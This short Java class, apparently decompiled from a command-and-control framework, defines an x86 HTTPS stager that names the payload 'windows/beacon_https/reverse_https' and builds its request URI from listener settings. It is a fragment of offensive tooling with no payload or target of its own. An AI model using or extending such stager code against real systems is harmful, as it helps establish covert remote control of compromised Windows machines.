package stagers;

import common.ScListener;

public class BeaconHTTPSStagerX86 extends GenericHTTPSStagerX86 {
   public BeaconHTTPSStagerX86(ScListener var1) {
      super(var1);
   }

   public String payload() {
      return "windows/beacon_https/reverse_https";
   }

   public String getURI() {
      return this.getConfig().getURI() + this.getConfig().getQueryString();
   }
}
